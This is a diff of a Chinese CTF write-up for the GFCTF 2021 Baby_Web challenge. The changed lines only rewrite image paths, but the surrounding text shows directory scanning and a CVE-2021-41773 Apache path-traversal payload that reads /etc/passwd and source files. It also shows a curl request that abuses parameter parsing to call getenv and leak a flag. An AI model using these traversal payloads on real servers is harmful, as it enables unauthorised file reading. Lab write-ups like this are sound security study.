@@ -8,7 +8,7 @@
 
 ## 02_最佳实践
 
-`dirsearch -u "http://node4.anna.nssnode.cn:29022"`![image-20261109141024023](%5BGFCTF%202021%5DBaby_Web/image-20261109141024023.png)
+`dirsearch -u "http://node4.anna.nssnode.cn:29022"`![image-20261109141024023](GFCTF2021_Baby_Web/image-20261109141024023.png)
 
 发现 `/cgi-bin`，结合之前学的 `CVE-2021-41773 Apache HTTP Server 2.4.49路径穿越漏洞`
 
@@ -16,7 +16,7 @@
 
 没招，只能用牛刀去任意文件读取了
 
-测试 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`![1794185611811](%5BGFCTF%202021%5DBaby_Web/1794185611811.png)
+测试 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`![1794185611811](GFCTF2021_Baby_Web/1794185611811.png)
 
 根据提示 `源码藏在上层目录xxx.php.txt里面`，读取 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/index.php.txt`
 
@@ -498,7 +498,7 @@ $var = 'module';  $val = 'action=function';  → $system['module'] = 'action=fun
 
 尝试 `space=admin&mod=xxx action=function name=getenv`，但是回显除了一个 `Array` 外，啥也没有
 
-![image-20261109180108262](%5BGFCTF%202021%5DBaby_Web/image-20261109180108262.png)
+![image-20261109180108262](GFCTF2021_Baby_Web/image-20261109180108262.png)
 
 
 
@@ -556,7 +556,7 @@ space=admin&mod=xxx action=function name=getenv param=FLAG
 
 
 
-![image-20261109134729161](%5BGFCTF%202021%5DBaby_Web/image-20261109134729161.png)
+![image-20261109134729161](GFCTF2021_Baby_Web/image-20261109134729161.png)
 
 
 
@@ -566,7 +566,7 @@ space=admin&mod=xxx action=function name=getenv param=FLAG
 curl -s "http://node4.anna.nssctf.cn:20884/?filename=index.html" -d "space=admin&mod=0%20action=function%20name=getenv%20param0=FLAG"
 ```
 
-![image-20261109094520901](%5BGFCTF%202021%5DBaby_Web/image-20261109094520901.png)
+![image-20261109094520901](GFCTF2021_Baby_Web/image-20261109094520901.png)
 
 
 
